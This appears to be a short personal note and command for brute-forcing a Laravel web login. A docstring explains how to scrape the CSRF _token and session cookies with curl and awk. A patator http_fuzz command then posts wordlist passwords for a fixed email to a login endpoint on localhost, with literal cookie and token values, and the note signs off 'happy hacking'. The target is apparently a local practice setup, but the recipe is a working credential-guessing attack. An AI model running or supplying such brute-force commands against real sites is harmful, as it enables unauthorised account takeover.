"""
url = your ajax action login point

header part is very important

get the field by  
cookie = $(curl -s -c dvwa.cookie "127.0.0.1:8000/login.php" | awk -F 'value=' '/_token/ {print $2}' | cut -d "'" -f2)

or use browser under network select the request then view the headers with the following

header = "Cookie: XSRF-TOKEN=field ; laravel_session=fieled"

also you have to get the hidden _token filed value for the request just inspect the page and look the html

run the script  with your fields

... happy hacking

"""
time  patator  http_fuzz  method=POST url="http://127.0.0.1:8000/login/user"  0=/usr/share/wordlists/fasttrack.txt body="email=hello@gmail.com&password=FILE0&_token=HEmuStR1wyJ4GAvE4zVwQ9nq14ZZ0YGw5yWHncIp" header="Cookie: XSRF-TOKEN=eyJpdiI6IkVwUGh4YmY4eFRqT2JEeFhjXC9xV2xnPT0iLCJ2YWx1ZSI6Ikh4cEhreGxHT1JBT3U1T2xQWE1kQ3VlZ3g3WldIWW04djFHSlRhamdCNWZLcWNaRVFiUXNCdnRoTjhKWWl6YStKa09lOWRkekJ3UkNEWk9ybEhheVNBPT0iLCJtYWMiOiI2NmI2ZWY2MDIwZTkyYTU3ZTczYWFiYWMwZTQwYTRmZDMwYTdlMjI0MzA0ZWRiM2RlN2VmMDU5NGE4ZWQ3N2U4In0%3D; laravel_session=eyJpdiI6Ilwvck9UQndqeHpnekVtYnp0THIwRlwvQT09IiwidmFsdWUiOiI4cFJYaXVzcFwvcVBpdW9BMTJ4cnVcL2FrUnhETUxMa2tiZ1Q0OEpYTzlDZzVSUm9KV0xSdVhrNFpLMVwvZWwxMjhKTVdKcHc0MTlBVzBcLzVxUkpKT0FaZHc9PSIsIm1hYyI6IjNlNWI4YWMzYWY1MTRhMjBhYTZjYmZmNjFjYTdjYjRjMzVjY2U2OGMyZDZhY2JjY2VkZTg2MzIxZmEyMjE0MjcifQ%3D%3D" -x ignore:fgrep=Fail accept_cookie=0
